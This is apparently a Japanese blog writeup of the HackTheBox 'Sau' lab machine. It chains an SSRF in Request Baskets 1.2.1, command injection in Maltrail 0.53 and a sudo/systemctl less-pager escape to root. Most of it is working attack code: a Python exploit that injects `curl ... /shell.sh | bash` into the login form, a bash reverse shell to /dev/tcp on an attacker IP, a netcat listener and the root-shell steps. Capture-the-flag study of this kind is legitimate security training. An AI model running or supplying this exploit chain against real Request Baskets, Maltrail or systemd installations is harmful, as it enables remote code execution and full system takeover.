+++
title = "HackTheBox - Sau Writeup"
date = "2026-04-16"
description = "SSRF → Maltrail RCE → sudo/systemctl でroot取得"
tags = ["HackTheBox", "CTF", "Linux", "SSRF", "CommandInjection", "CVE-2023-27163", "CVE-2023-26604", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field      | Details           |
|------------|-------------------|
| Machine    | Sau               |
| OS         | Linux (Ubuntu)    |
| Difficulty | Easy              |
| IP         | 10.129.229.26     |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.229.26
```

```text
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
55555/tcp open     http    Golang net/http server
```

- ポート80はfiltered（外部から直接アクセス不可）
- ポート55555でHTTPサービスが動作

---

## Web Enumeration (Port 55555)

ブラウザで `http://10.129.229.26:55555` にアクセスすると **Request Baskets v1.2.1** が動作していることを確認。

```text
Powered by request-baskets | Version: 1.2.1
```

CVE-2023-27163（SSRF）の影響を受けるバージョン。

参考: https://nvd.nist.gov/vuln/detail/CVE-2023-27163

---

## SSRF Exploitation (CVE-2023-27163)

### バスケット設定

Request Basketsでバスケットを作成し、以下の設定を適用。

```text
Forward URL    : http://127.0.0.1:80
Proxy Response : ON
Expand Path    : ON
```

### 動作確認

```bash
curl http://10.129.229.26:55555/euj30wx
```

内部ポート80で **Maltrail v0.53** が動作していることを確認。

```text
Powered by Maltrail (v0.53)
```

---

## Payload Generation

### shell.sh（リバースシェル）

```bash
cat > shell.sh << 'EOF'
bash -i >& /dev/tcp/10.10.16.166/4444 0>&1
EOF
```

### exploit.py

```python
#!/usr/bin/env python3
import sys
import requests

def exploit(attacker_ip, attacker_port, target_url):
    payload = f'curl http://{attacker_ip}:{attacker_port}/shell.sh | bash'
    data = {'username': f';`{payload}`'}
    try:
        requests.post(f'{target_url}/login', data=data, timeout=5)
    except Exception:
        pass

if __name__ == '__main__':
    attacker_ip   = sys.argv[1]
    attacker_port = sys.argv[2]
    target_url    = sys.argv[3]
    print(f"[*] Target  : {target_url}/login")
    print(f"[*] Sending exploit...")
    exploit(attacker_ip, attacker_port, target_url)
    print(f"[*] Done. Check your listener on port {attacker_port}")
```

---

## Delivery

```bash
python3 -m http.server 80
```

---

## Listener

```bash
nc -lnvp 4444
```

---

## Trigger

```bash
python3 exploit.py 10.10.16.166 80 http://10.129.229.26:55555/euj30wx
```

---

## Foothold

```bash
connect to [10.10.16.166] from (UNKNOWN) [10.129.229.26] 41946
bash: cannot set terminal process group (876): Inappropriate ioctl for device
bash: no job control in this shell
puma@sau:/opt/maltrail$
```

```bash
whoami
```

```text
puma
```

---

## System Info

```bash
systemctl --version
```

```text
systemd 245 (245.4-4ubuntu3.22)
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP
+GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2
-IDN +PCRE2 default-hierarchy=hybrid
```

---

## Post Exploitation

```bash
sudo -l
```

```text
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

---

## Results

- `sudo` でパスワードなしに `systemctl status trail.service` をroot実行可能
- Systemd 245 は CVE-2023-26604 の影響を受けるバージョン
- `systemctl status` がLessページャーを起動し、Lessから任意コマンド実行が可能

---

## Privilege Escalation

シェルを安定化する。

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 20
```

Lessページャーを起動させる。

```bash
sudo /usr/bin/systemctl status trail.service
```

Lessの `:` プロンプトで以下を入力。

```text
!/bin/bash
```

---

## Root Shell

```bash
whoami
```

```text
root
```

---

## Flags

### User

```bash
cat /home/puma/user.txt
```

### Root

```bash
cat /root/root.txt
```

---

## Summary

SSRF (CVE-2023-27163) → Maltrail v0.53 コマンドインジェクション → puma → sudo + systemctl + Less (CVE-2023-26604) → root
